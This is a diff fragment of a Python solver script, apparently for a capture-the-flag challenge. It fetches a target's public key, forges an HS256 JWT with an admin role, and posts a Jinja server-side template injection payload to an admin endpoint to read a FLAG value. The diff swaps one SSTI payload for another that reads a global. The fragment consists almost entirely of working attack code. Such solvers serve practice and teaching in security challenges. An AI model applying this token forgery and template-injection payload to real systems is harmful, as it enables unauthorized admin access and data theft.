@@ -44,7 +44,7 @@ def expected_flag():
 def solve():
     pub = requests.get(f"{TARGET}/public.pem", timeout=10).content
     token = forge_hs256({"sub": "attacker", "role": "admin"}, pub)
-    ssti = "{{config.__class__.__init__.__globals__['os'].environ.get('FLAG')}}"
+    ssti = "{{config.__class__.__init__.__globals__['FLAG']}}"
     r = requests.post(
         f"{TARGET}/admin/report",
         headers={"Authorization": f"Bearer {token}"},
